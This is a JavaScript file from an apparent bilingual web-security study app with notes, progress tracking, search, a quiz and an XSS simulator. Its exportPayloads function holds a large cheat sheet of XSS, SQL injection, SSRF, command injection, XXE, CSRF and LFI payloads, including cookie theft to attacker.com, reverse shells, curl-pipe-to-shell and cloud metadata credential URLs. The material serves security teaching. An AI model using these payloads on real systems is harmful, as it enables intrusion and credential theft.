        >${note.content}</textarea>
        <div class="mt-2 text-muted small">
          <i class="fa-solid fa-calendar"></i> ${new Date(note.timestamp).toLocaleString()}
        </div>
      </div>
    </div>
  `).join('');
}

// Save quick note
function saveQuickNote() {
  const quickNoteElement = document.getElementById('quick-notes');
  if (quickNoteElement) {
    const quickNote = quickNoteElement.value;
    localStorage.setItem('quickNote', quickNote);
    alert(txt('تم حفظ الملاحظة السريعة', 'Quick note saved'));
  }
}

// Clear quick note
function clearQuickNote() {
  const quickNoteElement = document.getElementById('quick-notes');
  if (quickNoteElement) {
    quickNoteElement.value = '';
    localStorage.removeItem('quickNote');
    alert(txt('تم مسح الملاحظة السريعة', 'Quick note cleared'));
  }
}

// Toggle quick note visibility
function toggleQuickNote() {
  const quickNoteCard = document.getElementById('quick-note-card');
  if (quickNoteCard) {
    if (quickNoteCard.style.display === 'none') {
      quickNoteCard.style.display = 'block';
    } else {
      quickNoteCard.style.display = 'none';
    }
  }
}

// Export all notes
function exportAllNotes() {
  const notes = JSON.parse(localStorage.getItem('enhancedNotes') || '[]');
  const quickNote = localStorage.getItem('quickNote') || '';

  let exportContent = `# ${txt('ملاحظاتي', 'My Notes')}\n\n`;

  if (quickNote) {
    exportContent += `## ${txt('ملاحظة سريعة', 'Quick Note')}\n${quickNote}\n\n`;
  }

  notes.forEach(note => {
    exportContent += `## ${note.title}\n${note.content}\n\n`;
  });

  const blob = new Blob([exportContent], { type: 'text/markdown' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `notes-${new Date().toISOString().slice(0, 10)}.md`;
  a.click();
}

// ========== NEW FEATURES ==========

// Session tracking
function startSession() {
  currentSessionStart = Date.now();
  studyStats.sessionsCount++;
  studyStats.lastSession = new Date().toISOString();
  localStorage.setItem('studyStats', JSON.stringify(studyStats));
}

function updateSessionTime() {
  if (currentSessionStart) {
    const sessionTime = Math.floor((Date.now() - currentSessionStart) / 60000);
    studyStats.totalTime += 1;
    localStorage.setItem('studyStats', JSON.stringify(studyStats));
  }
}

function getSessionTime() {
  if (!currentSessionStart) return 0;
  return Math.floor((Date.now() - currentSessionStart) / 60000);
}

// Progress tracking
function toggleProgress(itemId) {
  studyProgress[itemId] = !studyProgress[itemId];
  localStorage.setItem('studyProgress', JSON.stringify(studyProgress));

  const checkbox = document.querySelector(`input[data-progress="${itemId}"]`);
  if (checkbox) {
    checkbox.checked = studyProgress[itemId];
  }

  updateProgressStats();
}

function updateProgressStats() {
  const total = Object.keys(studyProgress).length;
  const completed = Object.values(studyProgress).filter(v => v).length;
  const percentage = total > 0 ? Math.round((completed / total) * 100) : 0;

  const statsEl = document.getElementById('progress-stats');
  if (statsEl) {
    statsEl.innerHTML = `${completed}/${total} (${percentage}%)`;
  }

  const progressBar = document.getElementById('progress-bar');
  if (progressBar) {
    progressBar.style.width = `${percentage}%`;
  }
}

// Bookmarks functions removed

// Custom payloads
function addCustomPayload() {
  const category = prompt(txt('الفئة (XSS, SQLi, SSRF, etc.):', 'Category (XSS, SQLi, SSRF, etc.):'));
  if (!category) return;

  const payload = prompt(txt('أدخل الـ Payload:', 'Enter the Payload:'));
  if (!payload) return;

  const description = prompt(txt('وصف (اختياري):', 'Description (optional):')) || '';

  customPayloads.push({ category, payload, description, timestamp: Date.now() });
  localStorage.setItem('customPayloads', JSON.stringify(customPayloads));

  loadPage('payloads');
}

function deleteCustomPayload(index) {
  if (confirm(txt('هل تريد حذف هذا الـ Payload؟', 'Delete this payload?'))) {
    customPayloads.splice(index, 1);
    localStorage.setItem('customPayloads', JSON.stringify(customPayloads));
    loadPage('payloads');
  }
}

function exportPayloads() {
  // Get the built-in payloads from the pagePayloads function
  const payloadCategories = [
    {
      title: 'XSS',
      payloads: [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(1)&gt;',
        '&lt;svg onload=alert(1)&gt;',
        '&lt;iframe src="javascript:alert(1)"&gt;',
        '&lt;body onload=alert(1)&gt;',
        '&lt;input autofocus onfocus=alert(1)&gt;',
        '&lt;select autofocus onfocus=alert(1)&gt;',
        '&lt;textarea autofocus onfocus=alert(1)&gt;',
        '&lt;marquee onstart=alert(1)&gt;',
        '&lt;div onmouseover="alert(1)"&gt;hover me&lt;/div&gt;',
        'javascript:alert(document.cookie)',
        '&lt;script src=//evil.com/xss.js&gt;&lt;/script&gt;',
        '&lt;img src=x onerror=fetch(\'http://attacker.com/?c=\'+document.cookie)&gt;',
        '&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;',
        '&lt;svg/onload=alert(1)&gt;',
        '&lt;details open ontoggle=alert(1)&gt;',
        '&lt;script&gt;document.location="http://attacker.com/steal.php?c="+document.cookie&lt;/script&gt;',
        '&lt;img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))"&gt;',
        '&lt;svg&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;',
        '&lt;iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"&gt;',
        '&lt;math&gt;&lt;mi&gt;&lt;script&gt;alert(1)&lt;/script&gt;'
      ]
    },
    {
      title: 'SQL Injection',
      payloads: [
        "' OR '1'='1' --",
        "admin'--",
        "1' UNION SELECT null,version()--",
        "1' AND SLEEP(5)--",
        "' OR 1=1--",
        "\" OR \"\"=\"",
        "' OR 'x'='x",
        "1' UNION SELECT username,password FROM users--",
        "1' ORDER BY 10--",
        "1' AND pg_sleep(5)--",
        "1' UNION SELECT null,null,database()--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' UNION SELECT table_name,null FROM information_schema.tables--",
        "1' AND IF(1=1,SLEEP(5),0)--",
        "\\' OR 1=1--",
        "' OR '1'='1'/*",
        "admin' OR 1=1#",
        "' UNION SELECT null,@@version--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(schema_name AS CHAR),0x7e)) FROM information_schema.schemata LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND 'v'='v",
        "1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()))),1)--",
        "1' AND JSON_EXTRACT(@@version, '$')--"
      ]
    },
    {
      title: 'SSRF',
      payloads: [
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:22',
        'file:///etc/passwd',
        'http://127.0.0.1:8080',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://[::1]:80',
        'http://127.0.0.1:3306',
        'http://localhost/admin',
        'gopher://127.0.0.1:25/_MAIL FROM:attacker',
        'dict://127.0.0.1:11211/stat',
        'http://0.0.0.0:8080',
        'http://localhost:6379',
        'file:///etc/hosts',
        'http://169.254.169.254/latest/user-data/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        'http://169.254.169.254/latest/user-data/0',
        'http://169.254.169.254/',
        'http://169.254.169.254/latest/meta-data/placement/availability-zone',
        'http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key',
        'http://169.254.169.254/latest/meta-data/hostname',
        'http://169.254.169.254/latest/meta-data/public-ipv4'
      ]
    },
    {
      title: 'Command Injection',
      payloads: [
        '; cat /etc/passwd',
        '| whoami',
        '&& id',
        '$(whoami)',
        '`id`',
        '; ls -la',
        '| nc -e /bin/sh attacker.com 4444',
        '&& curl http://attacker.com/shell.sh | sh',
        '; wget http://attacker.com/backdoor.sh -O /tmp/b.sh',
        '$(cat /etc/shadow)',
        '`cat /etc/passwd`',
        '; uname -a',
        '|| whoami',
        '& ping -c 10 attacker.com &',
        '; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        '$(curl http://attacker.com/?data=$(cat /etc/passwd))',
        '; bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
        '| python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        '& perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f',
        '|| python -c "exec(\'ZHVtcA==\'.decode(\'base64\'))"'
      ]
    },
    {
      title: 'XXE',
      payloads: [
        '&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;',
        '&lt;!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml"&gt;',
        '&lt;!DOCTYPE xxe [&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt; %d;]&gt;',
        '&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;',
        '&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;',
        '&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'&gt;"&gt;%eval;%exfil;',
        '&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///dev/random"&gt;]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;',
        '&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;%dtd;',
        '&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM "file:///etc/shadow"&gt;]&gt;&lt;data&gt;&file;&lt;/data&gt;',
        '&lt;!ENTITY xxe SYSTEM "expect://id"&gt;',
        '&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;',
        '&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt; %xxe; ]&gt;',
        '&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"&gt;&lt;!ENTITY % dtd "&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY % eval SYSTEM \'file:///invalid/xxx/\'&gt;"&gt;',
        '&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt; &lt;!ENTITY % dtd "&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY % eval SYSTEM \'file:///invalid/xxx/\'&gt;"&gt; %dtd; %eval;]&gt;',
        '&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/ext.dtd"&gt; %xxe;]&gt;'
      ]
    },
    {
      title: 'CSRF',
      payloads: [
        '&lt;img src="http://target/change-email?email=attacker@evil.com"&gt;',
        '&lt;form action="http://target/transfer" method="POST"&gt;&lt;input type="hidden" name="amount" value="1000"&gt;&lt;/form&gt;',
        '&lt;form action="http://target/delete-account" method="POST" id="csrf"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById("csrf").submit()&lt;/script&gt;',
        '&lt;iframe style="display:none" name="csrf-frame"&gt;&lt;/iframe&gt;&lt;form method="POST" action="http://target/change-password" target="csrf-frame"&gt;&lt;input type="hidden" name="password" value="hacked123"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        'fetch(\'http://target/api/transfer\', {method: \'POST\', body: JSON.stringify({amount: 1000, to: \'attacker\'}), credentials: \'include\', headers: {\'Content-Type\': \'application/json\'}})',
        '&lt;img src="http://target/admin/delete-user?id=123"&gt;',
        '&lt;form action="http://target/settings" method="POST"&gt;&lt;input type="hidden" name="admin" value="true"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        '&lt;link rel="prerender" href="http://target/logout"&gt;',
        '&lt;form action="http://target/api/transfer" method="POST"&gt;&lt;input type="hidden" name="to" value="attacker"&gt;&lt;input type="hidden" name="amount" value="1000"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
        '&lt;img src="http://target/api/delete-account" onload="fetch(\'http://target/api/delete-account\', {method: \'POST\', credentials: \'include\'})"&gt;',
        '&lt;form id="csrf" action="http://target/change-password" method="POST"&gt;&lt;input type="hidden" name="password" value="owned123"&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(\'csrf\').submit()&lt;/script&gt;',
        '&lt;iframe src="javascript:document.forms[0].submit()"&gt;&lt;/iframe&gt;'
      ]
    },
    {
      title: 'IDOR',
      payloads: [
        '/api/user/1/profile',
        '/documents/invoice_123.pdf',
        '/admin/users?id=2',
        '/download?file=../../../etc/passwd',
        '/api/account/456/details',
        '/files/document.pdf?id=100',
        '/user/settings?user_id=999',
        '/messages/read?msg_id=500',
        '/orders/view?order=12345',
        '/admin/reports?report_id=1',
        '/api/v1/users/2/private-data',
        '/uploads/../../etc/shadow',
        '/profile?uid=administrator',
        '/api/messages?to=admin&read=true',
        '/download.php?file=/var/www/html/config.php',
        '/api/users/1/account',
        '/api/users/2/account',
        '/api/users/3/account',
        '/api/documents/secret_doc_123',
        '/api/documents/confidential_report_456',
        '/api/users/1/delete',
        '/api/users/1/reset-password',
        '/api/users/1/change-email?email=attacker@evil.com',
        '/api/users/1/role/admin'
      ]
    },
    {
      title: 'LFI/RFI',
      payloads: [
        '../../../../etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'http://evil.com/shell.txt',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        '../../../../../../../etc/shadow',
        'php://input',
        'php://filter/read=string.rot13/resource=config.php',
        'file:///etc/passwd',
        '....//....//....//etc/passwd',
        'zip://shell.jpg%23shell.php',
        'phar://shell.phar/shell.php',
        'expect://id',
        '/var/log/apache2/access.log',
        'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
        '../../../../../../windows/win.ini',
        '../../../../proc/self/environ',
        'php://filter/resource=/etc/passwd',
        'data://text/plain,<?php system($_GET[\'cmd\']); ?>',
        'php://filter/convert.base64-encode/resource=/var/www/html/config.php',
        '/proc/self/cmdline',
        '/proc/self/fd/0',
        '/proc/self/fd/1',
        '/proc/self/fd/2'
      ]
    }
  ];

  // Get custom payloads from localStorage
  const customPayloads = JSON.parse(localStorage.getItem('customPayloads') || '[]');

  // Create export data
  const exportData = {
    builtInPayloads: payloadCategories,
    customPayloads: customPayloads,
    exportDate: new Date().toISOString(),
    version: '2.0'
  };

  // Create and download file
  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportData, null, 2));
  const downloadAnchorNode = document.createElement('a');
  downloadAnchorNode.setAttribute("href", dataStr);
  downloadAnchorNode.setAttribute("download", "payloads-export.json");
  document.body.appendChild(downloadAnchorNode);
  downloadAnchorNode.click();
  downloadAnchorNode.remove();
}

function importPayloads() {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.json';

  input.onchange = e => {
    const file = e.target.files[0];
    const reader = new FileReader();
    reader.readAsText(file, 'UTF-8');

    reader.onload = readerEvent => {
      try {
        const content = readerEvent.target.result;
        const importData = JSON.parse(content);

        if (importData.customPayloads && Array.isArray(importData.customPayloads)) {
          // Merge custom payloads
          const existingPayloads = JSON.parse(localStorage.getItem('customPayloads') || '[]');
          const mergedPayloads = [...existingPayloads, ...importData.customPayloads];

          // Remove duplicates based on payload content
          const uniquePayloads = mergedPayloads.filter((payload, index, self) =>
            index === self.findIndex(p => p.payload === payload.payload && p.category === payload.category)
          );

          localStorage.setItem('customPayloads', JSON.stringify(uniquePayloads));
          alert(txt('تم استيراد Payloads بنجاح!', 'Payloads imported successfully!'));
          loadPage('payloads');
        } else {
          alert(txt('تنسيق الملف غير صحيح', 'Invalid file format'));
        }
      } catch (error) {
        console.error('Import error:', error);
        alert(txt('فشل في استيراد الملف', 'Failed to import file'));
      }
    };
  };

  input.click();
}

// Quiz functionality
function submitQuiz(quizId, answers) {
  const quizzes = {
    basics: [
      { q: 'What does XSS stand for?', correct: 'Cross-Site Scripting' },
      { q: 'Which port is HTTP?', correct: '80' },
      { q: 'What does OWASP stand for?', correct: 'Open Web Application Security Project' }
    ]
  };

  const quiz = quizzes[quizId];
  if (!quiz) return;

  let score = 0;
  answers.forEach((answer, index) => {
    if (quiz[index] && answer.toLowerCase().includes(quiz[index].correct.toLowerCase())) {
      score++;
    }
  });

  const percentage = Math.round((score / quiz.length) * 100);
  quizScores[quizId] = { score, total: quiz.length, percentage, timestamp: Date.now() };
  localStorage.setItem('quizScores', JSON.stringify(quizScores));

  alert(txt(`النتيجة: ${score}/${quiz.length} (${percentage}%)`, `Score: ${score}/${quiz.length} (${percentage}%)`));
}

// Search functionality
function searchContent(query) {
  query = query.toLowerCase().trim();
  if (!query) return;

  const searchResults = [];
  const lang = currentLang;

  // Search in UnifiedLearningData if available
  if (typeof UnifiedLearningData !== 'undefined') {
    const data = UnifiedLearningData;

    // Search Learning Paths
    if (data.paths) {
      data.paths.forEach(path => {
        if (path.title.toLowerCase().includes(query) ||
          (path.titleAr && path.titleAr.includes(query)) ||
          path.description.toLowerCase().includes(query)) {
          searchResults.push({
            type: 'path',
            id: path.id,
            name: lang === 'ar' && path.titleAr ? path.titleAr : path.title,
            icon: 'fa-road',
            page: 'learn'
          });
        }
      });
    }

    // Search Rooms
    if (data.rooms) {
      data.rooms.forEach(room => {
        if (room.title.toLowerCase().includes(query) ||
          (room.titleAr && room.titleAr.includes(query)) ||
          room.description?.toLowerCase().includes(query)) {
          searchResults.push({
            type: 'room',
            id: room.id,
            name: lang === 'ar' && room.titleAr ? room.titleAr : room.title,
            icon: 'fa-door-open',
            page: `room-${room.id}`
          });
        }
      });
    }

    // Search Modules
    if (data.modules) {
      data.modules.forEach(mod => {
        if (mod.title.toLowerCase().includes(query) ||
          (mod.titleAr && mod.titleAr.includes(query))) {
          searchResults.push({
            type: 'module',
            id: mod.id,
            name: lang === 'ar' && mod.titleAr ? mod.titleAr : mod.title,
            icon: 'fa-cube',
            page: 'learn'
          });
        }
      });
    }

    // Search CTF Challenges
    if (data.ctfChallenges) {
      data.ctfChallenges.forEach(ctf => {
        if (ctf.title.toLowerCase().includes(query) ||
          (ctf.titleAr && ctf.titleAr.includes(query))) {
          searchResults.push({
            type: 'ctf',
            id: ctf.id,
            name: lang === 'ar' && ctf.titleAr ? ctf.titleAr : ctf.title,
            icon: 'fa-flag',
            page: 'practice'
          });
        }
      });
    }
  }

  // Search in navigation sections
  sections.forEach(section => {
    if (section.ar.toLowerCase().includes(query) || section.en.toLowerCase().includes(query)) {
      searchResults.push({
        type: 'page',
        id: section.id,
        name: section[lang],
        icon: 'fa-file',
        page: section.id
      });
    }
  });

  displaySearchResults(searchResults, query);
}

function displaySearchResults(results, query) {
  // Remove existing modal
  document.querySelector('.search-modal')?.remove();

  const modal = document.createElement('div');
  modal.className = 'search-modal';
  modal.innerHTML = `
    <div class="search-modal-overlay" onclick="this.parentElement.remove()"></div>
    <div class="search-modal-content">
      <div class="search-modal-header">
        <h3><i class="fa-solid fa-search"></i> ${txt('نتائج البحث عن', 'Search results for')} "${query}"</h3>
        <button class="close-modal" onclick="this.closest('.search-modal').remove()">
          <i class="fa-solid fa-xmark"></i>
        </button>
      </div>
      <div class="search-modal-body">
        ${results.length === 0 ? `
          <div class="no-results">
            <i class="fa-solid fa-search" style="font-size: 48px; opacity: 0.3;"></i>
            <p>${txt('لا توجد نتائج', 'No results found')}</p>
          </div>
        ` : `
          <ul class="search-results">
            ${results.map(r => `
              <li onclick="handleSearchClick('${r.page}'); document.querySelector('.search-modal').remove();">
                <i class="fa-solid ${r.icon}"></i>
                <div class="result-info">
                  <span class="result-name">${r.name}</span>
                  <span class="result-type">${r.type}</span>
                </div>
              </li>
            `).join('')}
          </ul>
        `}
      </div>
    </div>
  `;

  // Add styles if not exist
  if (!document.getElementById('search-modal-styles')) {
    const styles = document.createElement('style');
    styles.id = 'search-modal-styles';
    styles.textContent = `
      .search-modal {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 99999;
        display: flex;
        align-items: flex-start;
        justify-content: center;
        padding-top: 100px;
      }
      .search-modal-overlay {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        backdrop-filter: blur(5px);
      }
      .search-modal-content {
        position: relative;
        width: 90%;
        max-width: 600px;
        max-height: 70vh;
        background: linear-gradient(180deg, rgba(15, 23, 42, 0.98) 0%, rgba(30, 41, 59, 0.98) 100%);
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 16px;
        overflow: hidden;
        box-shadow: 0 25px 80px rgba(0,0,0,0.5);
      }
      .search-modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 20px;
        border-bottom: 1px solid rgba(255,255,255,0.1);
      }
      .search-modal-header h3 {
        margin: 0;
        color: #22c55e;
        font-size: 16px;
      }
      .search-modal-header .close-modal {
        background: transparent;
        border: none;
        color: rgba(255,255,255,0.5);
        font-size: 20px;
        cursor: pointer;
        padding: 5px;
      }
      .search-modal-header .close-modal:hover {
        color: #ef4444;
      }
      .search-modal-body {
        padding: 10px;
        max-height: 50vh;
        overflow-y: auto;
      }
      .search-results {
        list-style: none;
        padding: 0;
        margin: 0;
      }
      .search-results li {
        display: flex;
        align-items: center;
        gap: 15px;
        padding: 15px;
        border-radius: 10px;
        cursor: pointer;
        transition: all 0.2s;
      }
      .search-results li:hover {
        background: rgba(34, 197, 94, 0.1);
      }
      .search-results li i {
        width: 40px;
        height: 40px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(34, 197, 94, 0.1);
        border-radius: 10px;
        color: #22c55e;
      }
      .result-info {
        display: flex;
        flex-direction: column;
        gap: 3px;
      }
      .result-name {
        color: #fff;
        font-weight: 600;
      }
      .result-type {
        color: rgba(255,255,255,0.4);
        font-size: 12px;
        text-transform: uppercase;
      }
      .no-results {
        text-align: center;
        padding: 40px;
        color: rgba(255,255,255,0.5);
      }
    `;
    document.head.appendChild(styles);
  }

  document.body.appendChild(modal);
}

function handleSearchClick(page) {
  loadPage(page);
}

// Copy command with notification
function copyCmd(btn) {
  handleCopyButton(btn);
}

function handleCopyButton(btn) {
  // Find the code element - handle different HTML structures
  let codeElement = btn.parentElement.querySelector('code');

  // If not found, try sibling
  if (!codeElement) {
    codeElement = btn.previousElementSibling;
    if (codeElement && codeElement.tagName !== 'CODE') {
      codeElement = btn.parentElement.previousElementSibling;
    }
  }

  // If still not found, try within list item
  if (!codeElement || codeElement.tagName !== 'CODE') {
    const listItem = btn.closest('li');
    if (listItem) {
      codeElement = listItem.querySelector('code');
    }
  }

  if (!codeElement || !codeElement.textContent) {
    console.error('Could not find code element near button');
    return;
  }

  const code = codeElement.textContent.trim();

  navigator.clipboard.writeText(code).then(() => {
    const originalText = btn.textContent;
    btn.textContent = '✓ ' + txt('تم', 'Done');
    btn.classList.add('copied');

    setTimeout(() => {
      btn.textContent = originalText;
      btn.classList.remove('copied');
    }, 2000);
  }).catch(err => {
    console.error('Failed to copy:', err);
    alert(txt('فشل النسخ', 'Copy failed'));
  });
}

// Command generator
function openCommandGenerator(tool) {
  const options = optionsData[tool];
  if (!options) return;

  const modal = document.createElement('div');
  modal.className = 'command-generator-modal';
  modal.innerHTML = `
    <div class="modal-content">
      <h3>${txt('مولد الأوامر', 'Command Generator')} - ${tool}</h3>
      <button class="close-modal" onclick="this.parentElement.parentElement.remove()">✕</button>
      <form id="cmd-gen-form">
        ${options.map((opt, i) => `
          <div class="form-group">
            <label>
              <input type="checkbox" name="opt-${i}" value="${opt.option}">
              <strong>${opt.option}</strong> - ${opt[currentLang]}
            </label>
            <input type="text" name="val-${i}" placeholder="${txt('القيمة', 'Value')}" class="form-control">
          </div>
        `).join('')}
        <button type="button" class="btn btn-primary" onclick="generateCommand('${tool}')">
          ${txt('توليد الأمر', 'Generate Command')}
        </button>
      </form>
      <div id="generated-cmd" class="mt-3"></div>
    </div>
  `;

  // Close modal when clicking outside
  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      modal.remove();
    }
  });

  // Close modal with ESC key
  const escHandler = (e) => {
    if (e.key === 'Escape') {
      modal.remove();
      document.removeEventListener('keydown', escHandler);
    }
  };
  document.addEventListener('keydown', escHandler);

  document.body.appendChild(modal);
}

function generateCommand(tool) {
  const form = document.getElementById('cmd-gen-form');
  const formData = new FormData(form);
  let command = tool;

  optionsData[tool].forEach((opt, i) => {
    const checked = form.querySelector(`input[name="opt-${i}"]`).checked;
    const value = form.querySelector(`input[name="val-${i}"]`).value;

    if (checked && value) {
      command += ` ${opt.option} ${value}`;
    } else if (checked) {
      command += ` ${opt.option}`;
    }
  });

  document.getElementById('generated-cmd').innerHTML = `
    <div class="cmd-box">
      <button class="copy" onclick="copyCmd(this)">نسخ</button>
      <code>${command}</code>
    </div>
  `;
}

// Show tool options in offcanvas
function showOptions(tool) {
  const options = optionsData[tool];
  if (!options) return;

  const offcanvasBody = document.getElementById('offcanvas-body');
  offcanvasBody.innerHTML = `
    <h6 class="fw-bold mb-3">${tool} ${txt('الأوبشنات', 'Options')}</h6>
    <button class="btn btn-sm btn-success mb-3" onclick="openCommandGenerator('${tool}')">
      <i class="fa-solid fa-wand-magic-sparkles"></i> ${txt('مولد الأوامر', 'Command Generator')}
    </button>
    <ul class="list-group">
      ${options.map(opt => `
        <li class="list-group-item">
          <strong><code>${opt.option}</code></strong>
          <p class="mb-1 small">${opt[currentLang]}</p>
          <div class="cmd-box">
            <button class="copy" onclick="copyCmd(this)">نسخ</button>
            <code>${opt.example}</code>
          </div>
        </li>
      `).join('')}
    </ul>
  `;

  const offcanvas = new bootstrap.Offcanvas(document.getElementById('optionsOffcanvas'));
  offcanvas.show();
}

// Filter payloads
function filterPayloads() {
  const query = document.getElementById('payload-search').value.toLowerCase();
  const cards = document.querySelectorAll('.col-md-6');

  cards.forEach(card => {
    const text = card.textContent.toLowerCase();
    card.style.display = text.includes(query) ? '' : 'none';
  });
}

// Export progress
function exportProgress() {
  const data = {
    progress: studyProgress,
    stats: studyStats,
    bookmarks: bookmarks,
    quizScores: quizScores,
    notes: localStorage.getItem('notes') || '',
    exportDate: new Date().toISOString()
  };

  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'study-hub-progress.json';
  a.click();
}

// Import progress
function importProgress() {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.json';
  input.onchange = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const data = JSON.parse(event.target.result);
        if (data.progress) localStorage.setItem('studyProgress', JSON.stringify(data.progress));
        if (data.stats) localStorage.setItem('studyStats', JSON.stringify(data.stats));
        if (data.bookmarks) localStorage.setItem('bookmarks', JSON.stringify(data.bookmarks));
        if (data.quizScores) localStorage.setItem('quizScores', JSON.stringify(data.quizScores));
        if (data.notes) localStorage.setItem('notes', data.notes);
        alert(txt('تم استيراد التقدم بنجاح!', 'Progress imported successfully!'));
        location.reload();
      } catch (err) {
        alert(txt('خطأ في قراءة الملف', 'Error reading file'));
      }
    };
    reader.readAsText(file);
  };
  input.click();
}

// ===== Global Search & Shortcuts =====
function handleGlobalSearch(input) {
  // Handle both string (from navbar) and event (from old search)
  let query;
  if (typeof input === 'string') {
    query = input.trim();
  } else if (input && input.target) {
    query = input.target.value.trim();
    if (input.key !== 'Enter') return;
  } else {
    return;
  }

  if (query) {
    searchContent(query);
  }
}

function clearGlobalSearch() {
  const input = document.getElementById('global-search');
  const clearBtn = document.getElementById('clear-search');
  if (input) {
    input.value = '';
    input.focus();
  }
  if (clearBtn) {
    clearBtn.style.display = 'none';
  }
}
function toggleShortcutsHelp() {
  const panel = document.getElementById('shortcuts-panel');
  if (!panel) return;
  panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
}

// ===== Playground Helpers =====
// XSS Simulator
function testXSS() {
  const input = document.getElementById('xss-input')?.value || '';
  const out = document.getElementById('xss-output');
  if (!out) return;

  // Simulate XSS by displaying the payload (NOT executing it for safety)
  out.innerHTML = `
    <div class="alert alert-warning">
      <strong><i class="fa-solid fa-exclamation-triangle"></i> Payload Detected:</strong>
      <pre class="mt-2 mb-0">${input.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
    </div>
    <div class="alert alert-info mt-2">
      <strong><i class="fa-solid fa-info-circle"></i> Analysis:</strong><br>
      ${input.toLowerCase().includes('<script') ? '✅ Contains &lt;script&gt; tag<br>' : ''}
      ${input.toLowerCase().includes('onerror') ? '✅ Contains event handler (onerror)<br>' : ''}
      ${input.toLowerCase().includes('onload') ? '✅ Contains event handler (onload)<br>' : ''}
      ${input.toLowerCase().includes('alert') ? '✅ Contains alert() function<br>' : ''}
      ${input.toLowerCase().includes('javascript:') ? '✅ Contains javascript: protocol<br>' : ''}
      <strong class="text-danger">⚠️ This is a simulated environment. Never test on real sites without permission!</strong>
    </div>
  `;
}

// SQL Injection Simulator
